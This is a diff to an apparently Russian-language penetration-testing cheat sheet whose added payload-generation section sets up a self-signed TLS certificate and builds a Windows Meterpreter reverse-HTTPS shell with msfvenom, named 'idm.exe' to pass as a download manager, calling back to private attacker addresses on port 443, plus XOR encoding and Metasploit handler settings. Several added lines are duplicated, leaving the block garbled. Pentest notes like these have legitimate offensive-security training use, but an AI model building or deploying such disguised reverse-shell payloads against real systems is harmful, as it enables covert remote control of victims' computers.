@@ -263,7 +263,42 @@ nc -vlkp 3000 2>/dev/null
 
 ## Генерация нагрузки
 ```
+ssl_config:
+[req]
+default_bits = 4096
+prompt = no
+default_md = sha256
+x509_extensions = v3_req
+distinguished_name = dn
+[dn]
+C = IN
+ST = Tashkent
+L = Uz
+O = J
+emailAddress = no@domain
+CN = ns1.domain
+[v3_req]
+basicConstraints = critical,CA:TRUE
+keyUsage = nonRepudiation, digitalSignature, keyEncipherment
+[alt_names]
+email =  noreplay@domain
+
+openssl req -new -x509 -newkey rsa:4096 -sha256 -nodes -keyout "server.key" -days 356 -out "cert.crt" -config ssl_config 
+cat server.key cert.crt > cert.pem
+msfvenom -p windows/meterpreter/reverse_winhttps lhost=192.168.65.135 lport=443 -f exe HandlerSSLCert=./cert.pem StagerVerifySSLCert=true -o idm.exe
+email =  noreplay@domain
+
+openssl req -new -x509 -newkey rsa:4096 -sha256 -nodes -keyout "server.key" -days 356 -out "cert.crt" -config ssl_config 
+cat server.key cert.crt > cert.pem
+
+msfvenom -p windows/meterpreter/reverse_winhttps lhost=192.168.65.135 lport=443 -f exe HandlerSSLCert=./cert.pem StagerVerifySSLCert=true -o idm.exe
+
+msf exploit(multi/handler) > set HandlerSSLCert /home/user/cert.pem
+msf exploit(multi/handler) > set StagerVerifySSLCert true
+
 msfvenom -p windows/meterpreter/reverse_winhttps lhost=172.16.7.2 lport=443 -e x86/xor_dynamic -f exe > idm4.exe
+// sudo msfconsole -qr auto.rc
+https://ppn.snovvcrash.rocks/pentest/c2/meterpreter
 ```
 
 ## RDP
@@ -335,3 +370,5 @@ ssh -L 3336:db001.host:3306 user@pub001.host
 ```
  openssl x509 -in cert.pem -noout -issuer -subject -dates -nameopt sep_multiline
 ```
+
+
